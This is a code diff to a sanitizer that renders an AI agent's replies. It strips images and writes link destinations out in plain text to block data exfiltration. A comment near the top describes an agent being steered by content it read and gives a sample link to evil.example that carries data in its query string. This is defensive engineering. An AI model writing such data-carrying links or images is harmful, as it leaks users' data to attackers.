@@ -4,7 +4,9 @@
  * Agent text is untrusted and can be steered by something the agent read, so
  * `[Open the report](https://evil.example/?d=<data>)` would hide a URL that
  * carries data behind friendly words, one click from leaving the building.
- * Every link becomes plain text with its destination written out.
+ * Every link becomes plain text with its destination written out. Every image
+ * is removed: no `src` survives sanitizing, so a reply cannot load one, and an
+ * attachment token would only leave a broken box.
  *
  * `renderCommentHtml` stays the only sanitizer (the flags feature uses it and
  * is not changed). This takes its sanitized output, swaps each anchor for a
@@ -28,6 +30,7 @@ function linkText(label: string, href: string | null): string {
 export function renderAgentHtml(text: string): string {
   const template = document.createElement('template')
   template.innerHTML = renderCommentHtml(text, [])
+  for (const image of template.content.querySelectorAll('img')) image.remove()
   for (const anchor of template.content.querySelectorAll('a')) {
     // The raw attribute, not `anchor.href`: that would resolve a relative link
     // against the page origin and show an address the agent never wrote.
